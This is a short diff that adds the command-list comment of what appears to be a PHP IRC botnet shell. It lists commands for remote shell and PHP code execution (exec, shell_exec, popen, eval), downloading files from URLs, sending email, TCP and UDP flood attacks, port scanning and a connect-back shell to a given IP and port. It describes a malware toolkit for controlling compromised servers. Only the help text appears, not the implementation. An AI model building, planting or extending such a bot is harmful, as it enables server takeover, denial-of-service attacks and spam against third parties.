@@ -1,0 +1,24 @@
+*  COMMANDS:
+ *
+ *  .user <password> //login to the bot
+ *  .logout //logout of the bot
+ *  .die //kill the bot
+ *  .restart //restart the bot
+ *  .mail <to> <from> <subject> <msg> //send an email
+ *  .dns <IP|HOST> //dns lookup
+ *  .download <URL> <filename> //download a file
+ *  .exec <cmd> // uses exec() //execute a command
+ *  .sexec <cmd> // uses shell_exec() //execute a command
+ *  .cmd <cmd> // uses popen() //execute a command
+ *  .info //get system information
+ *  .php <php code> // uses eval() //execute php code
+ *  .tcpflood <target> <packets> <packetsize> <port> <delay> //tcpflood attack
+ *  .udpflood <target> <packets> <packetsize> <delay> //udpflood attack
+ *  .raw <cmd> //raw IRC command
+ *  .rndnick //change nickname
+ *  .pscan <host> <port> //port scan
+ *  .safe  // test safe_mode (dvl)
+ *  .inbox <to> // test inbox (dvl)
+ *  .conback <ip> <port> // conect back (dvl)
+ *  .uname // return shell's uname using a php function (dvl)
+ *  .raw nick nickgoeshere
